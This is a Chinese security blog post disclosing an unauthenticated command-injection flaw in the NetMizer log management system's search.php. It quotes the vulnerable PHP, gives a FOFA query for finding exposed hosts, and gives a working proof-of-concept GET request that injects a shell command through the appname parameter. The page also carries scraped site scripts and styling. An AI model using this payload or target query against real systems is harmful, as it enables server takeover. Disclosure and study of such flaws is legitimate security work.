---
title: "NetMizer日志管理系统 search.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-search-appname-rce.html
asset_dir: assets/netmizer日志管理系统-search.php-命令执行漏洞
---

# NetMizer日志管理系统 search.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/19 08:33
* 815浏览
* [0评论](#comment)
* 24分钟阅读

深入探索

应用程序

网页服务器

Web服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/search.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞扫描服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

深入探索

Windows安全工具

服务器安全服务

授权

看下 `search.php` 业务实现关键逻辑部分

```
else if($action == 'addtask'){
    $search_root = "/var/www/$path";
    ......
if($path == 'search') $appname = 'search';
else if($path == 'url') $appname = 'search_url';
else if($path == 'https') $appname = 'search_https';
else if($path == 'host_search') $appname = 'search_host';
else if($path == 'dst_search') $appname = 'dst_search';
$cmd_root = "/var/www/cgi-bin/$appname";
......
if(is_dir($search_root) == false) mkdir($search_root);
if(!isset($now)) $now = time();
$filename = $search_root."/".$now.".cfg";
$fp = fopen($filename, "w");
if($fp) {
    fputs($fp, $str);
    fclose($fp);
    chdir("/var/www/cgi-bin/");
    $cmd = $cmd_root." -t -i $now > /dev/null &";
    //$cmd = $cmd_root." -t -v -i $now > /tmp/aa1.txt &";
    @exec($cmd);
}
echo '{"success":true}';
return;
```

深入探索

漏洞修复方案

数据库

文本剥离工具

当 `$action = 'addtask'` 时，用户可控参数 `$appname` （变量覆盖）直接用于构建命令行字符串 `$cmd`，并通过 `exec($cmd)` 执行。该参数未经过充分过滤或转义，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

同样当 `$action = 'showtask'` 时，也存在同样的命令注入漏洞

网络安全

```
else if($action == 'showtask'){
    if($csv) $arr_proto = getcontentdesc(0);
    else $arr_proto = getcontentdesc();

    $curid = $page;
    $linenum = $limit;

    if($path == 'search') $appname = 'search';
    else if($path == 'url') $appname = 'search_url';
    else if($path == 'https') $appname = 'search_https';
    else if($path == 'host_search') $appname = 'search_host';
    else if($path == 'dst_search') $appname = 'dst_search';
    $cmd_root = "/var/www/cgi-bin/$appname";
    $cmd = $cmd_root." -i ".intval($id)." -p ";

    chdir("/var/www/html/");
    if(!$csv){
       $total = gettotal(intval($id), $path);
       if($total == 0){
          $fp=@popen($cmd, "r");
          $line=fgets($fp,256);
          if(substr($line, 0, 5)=="Error") {
             @pclose($fp);
             return $line;
          }
          while($line=fgets($fp,2048)){
             $total++;
          }
          @pclose($fp);
       }
       $startline = ($curid-1)*$linenum;
       $endline = $curid*$linenum;
       $cmd .= " -s $startline -e $endline";
    }
    $fp=@popen($cmd, "r");
```

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

计算机服务器

```
GET /data/search/search.php?action=addtask&appname=search;sleep+3+%23 HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 search.php 命令执行漏洞](images/img-001-e97703d6477d.webp)](https://image.mrxn.net/6f01ae2fc3b642b18e635b28bc57e2c3.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 search.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-search-search-appname-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-search-search-appname-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网站托管与域名注册

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-search-appname-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALjklEQVR4AeycjVbjyA6E+eb933lvyjXVVv/YSRgguQdzECWVSnLT6g6B2bN/Pj4+/vus/Td81D5DqoVVE78lT5xog5EmFq64M1650dKjYjSVkx9eqFgm/19MA7nVX5/vsgNtILfpfjxqR4uv9cAHMEmrJj6wacGYInAMTGsD59JDCOZS/1Wo3rL0Az9HXCy5YPhHMDXCNhAFl71+B6aBgKcPM95bLuw10cLOAaEfwnq6HimIPtrEwHYDw69w1AIr2dMcsD0bZlw1mwayEl3cz+3Atw0kJy64+pbApyaaIJivNWAOjDV35IO16bvC1IK1iYUwc+Jj4DwQ6p/x2wbyzyv7pQ2+ZCDA9jpZT+C4n8mNvGJwPRjFycAx7O+yxFeDXQP2k88zoeeTF0ZzhuB6MKruu+xLBvJdi/uNfb9nIL9xJ7/oe54GcnZ1j56ZmpoHX284xqqv/qpfzcuPZoXKy8DPjgYcwzGqLgbWJU6fFUYz4kobbtQqngYi8rLX7UAbCPg0wH0clwuuGXnF42lILFReJl8m/1kDPxuYStVTBhy+6VBeNhUXQnkZuE9S4BgI1RDYngn3sRXdnDaQm399vsEO/NHkP2tn609P8Ak500KvgT4+q81zhEc65WTgvkCTAttJbkRxVCODXgN9XEqmP4Kq/hm7bkjdzTfwp4GApw/G1RrBOTBGA46BUO3ENKI4OTmF6tzkhV3iFgDbyYYZb+mHP9W72llh1cmvWujXkRzsfLgznAZyJr5y378DbSDgSWrysrNHK7+yWgPuB8bowTFQ5Q/76bMqOMtJn3xF8TJgu3HyYzBzysGaVy695Y8GrgNj8uAY+GgD+Xj/j1+xwmsgbzbmP+DrcrQucB5mTA04l1h4dnWVr3akBfeFGVNTEawLB47BWJ8J5sCYHDiG/S/MY7/EK0yf4EoTDvysaIXXDdEuvJG1XwyfWVMmnJoxDi88yykvg/mkiK+WPkGYa5KrdfLDg2sA0ZslF9zIv1+A7Qc9GP/SHQfOgTGaR3D1zOuGPLJzP6hpA8m04P6k4b7m6HvIc4Rw3keaWPrBcQ2sc7Dm1ROcA6O4WJ4dPOKTF0bzDKou1gbyTINL+3078NRAMsVglgU+XeGFYG7UgHkgqQlVLwOm12vxsqloQUh3ZJGP+fAVweuItubigzVgPOLBeSCSDp8aSFd5Bd+yA9dAvmVbP990Gsgz1xLYXlJSA46BwxVFW3EUA11faaOBPhdeKJ1MvgysBaO4I4P7mtSCtbCjniuLZoXKV1tppoGsRBf3cztwOJA6yfhZ1hiPfPLC5M5QOlk08mWJhYpl8qvBfkrDgznpZSMPhJpQ+hjQ3dSIk08sBGvlHxlYAz1W/eFAqujyf24H2h8XwVPLo8Ex7Djmxhh2LfR+tCsEa8ccmAfG1HZyoeeBjR9P8BhPzW5ENOAewI31J7D1dXT+deyTuOJZh+uGnO3OC3Ltj4uZIPg0JK5rChesuXt+asD9YcfkguDcvZ738uA+YEx/4b3aVR7cB4zqM9pYB9bCjmea64aMu/PiuA0EPMFMPOtKLAwH1iZWTpZYqFgmXwZ9jTjlZfJlYI04mbgY9DnlR4t2xOgqHw7cF4xV8xkf3Cf9zzD9q6YNJMkLv2QHPt3kGsint+57Ctvb3lybRx4TbRDmawrmxn6pEcJakxppRoO+BhwDKZsQ2N62wo4RpX/iismNWDX3fJifmZr0TSy8boh24Y3s7kBgnzCs/dX3M05/jFUTDtxXnAwcw47iq4FzlYsPx7lojjBrEkYD7gdG5WTgGHYcaxJXBOvDgWPg+g/lPt7so/1imHXBPi0g9IY6FSvbkrcvQHutvoXdJ+w5sB/B2HPFw3lN7ZH6YM3FB/cDY/jUCKHPRQPmpYklN2LyFaOpXPy7L1kRXvgzO9AGAv3Uz6YIvTZLTY1wxYmvFg24HxijSf4MwTXAJDvrc5YbGwHt5gNjuouBTduRBwHM2jaQg5qL/uEduAbywxt+73HtF8MI61UON+KRBnwFYcfUws6B/eTGftDno1thaoWrfOXAfWFH1clg58C+eFntIV+cTP5o4mUjrxjcV75MutGuG6KdeSM7HAj009SawRz0qJysTluxDKxNTlwMnEscTRCcByJpCGw/PGHGiKDPpa9w1IgbLZpg8okrQv8scFw1ow/WwI6HAxmLr/hndqD9Ypjpg6eVuGKWVLnqJ18x+XCJheHAz4QekxdKX02crHLxxcvGGPb+ylcD5+5xNZ/+z2J6rOquG5LdeRNsA4H5hGiNYB5QuBmwvX5vwe0L9PGNmj5h1uSEjOIjftQdxamH+ZmpiSbxGY5amPvCzKknmIcdxR9ZG8iR4OJ/dgemgYynIbEwS5MvG2OYTwGYk14GjoGUt//bg/KylnjAAbbbCjQ1sHEh1HO05J5B6PvW2vSHXhNeGD1YA8bwwmkgIi973Q68YCCv+2b/H548/ekE5ms0fiNgDfSoaxlLzVEsPhro+4SXJhYuGL7imEsMfX8gqenlEthe7oCmATauEQ844BrY8YGy618MH9mkn9R86iWrnkr5WTDcPw0wa9RDlj5nCK4/04w59ZaNvGI47qcamXQrA9cCq/RdTr1lwHYDgeuGfLzZR7shmlS1rBP26a04mP+fILUPuD61qxz0mmjBPBCqveYD7VSB/YjAcZ4V/gyhr1HtmX7MQV+fvPrEwgWhr5GuDSSiC1+7A20g4GmNy9HUYsklDoJrYcdoR4Rdk/pgtGBNeCGYiyaoXCzciDDXgrnUBsdaxWMu8QqlP7JRHx14LcD1M+TjzT7aDXmzdf3a5bSB5DqBr092BBzD/sMbzEWT2sQVx1xiIbgPGFOnnAzMw/7saEZ8NlZ/GfgZj9RLL/usFvwsMKqXrPZrA6nk5b9uB9pAYD01TTCWZY5x+IrgfmBMDhwDoSYEtre0U+JGgHOrNYBzN1n3udJGcJYD9wNjaoJgHnZM7rPYBvLZBlfd1+7A9G/qY3uYpw87B4wlW3x08sILN+Hti/xqN2r7POM2wfAl+tDAdtPAmLwQzEGPqa0ovQysrbn4ysug14BjINLpl9uWuDnXDbltwjt9toEA3WkCx6vF6iRUg1kLM6deYB5Q2BmwraEj/wbgHBj/0kvI2sYkuBb2d22jFnbNWJ8YrEkshJkT/4hlDcI2kEcKL83370D7BypNp9rZo8GnAYy1bvTTB6xNLIwWnEusnAzMw36ixctgz8Hal06WvhWhr0lO+tjIJQ5